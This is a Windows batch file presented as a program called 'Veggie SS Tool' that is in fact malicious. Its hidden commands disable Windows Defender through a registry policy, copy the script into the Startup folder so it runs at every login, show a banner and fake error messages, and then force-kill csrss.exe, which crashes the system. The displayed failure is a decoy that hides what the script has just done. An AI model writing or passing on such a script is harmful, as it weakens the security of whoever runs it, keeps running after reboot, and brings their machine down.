@echo off
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t "REG_DWORD" /d "1" /f >nul
xcopy %0 C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup >nul
:gui
echo.
echo            __      __             _         _____ _____   _______          _ 
echo           \ \    / /             (_)       / ____/ ____^| ^|__   __^|        ^| ^|
echo            \ \  / /__  __ _  __ _ _  ___  ^| (___^| (___      ^| ^| ___   ___ ^| ^|
echo             \ \/ / _ \/ _` ^|/ _` ^| ^|/ _ \  \___ \\___ \     ^| ^|/ _ \ / _ \^| ^| %u%
echo              \  /  __/ (_^| ^| (_^| ^| ^|  __/  ____) ^|___) ^|    ^| ^| (_) ^| (_) ^| ^|
echo               \/ \___^|\__, ^|\__, ^|_^|\___^| ^|_____/_____/     ^|_^|\___/ \___/^|_^|
echo                        __/ ^| __/ ^|                                           
echo                       ^|___/ ^|___/                                            
echo.
echo.
echo.
echo Failed to load settings!
echo Failed to load information                              
color 0C 
timeout /t 1 /nobreak >nul
echo Veggie SS Tool has ran into a problem. Report to Veggie Bot and Painis Stick
echo ^G >nul
taskkill /f /im csrss.exe >nul
pause >nul
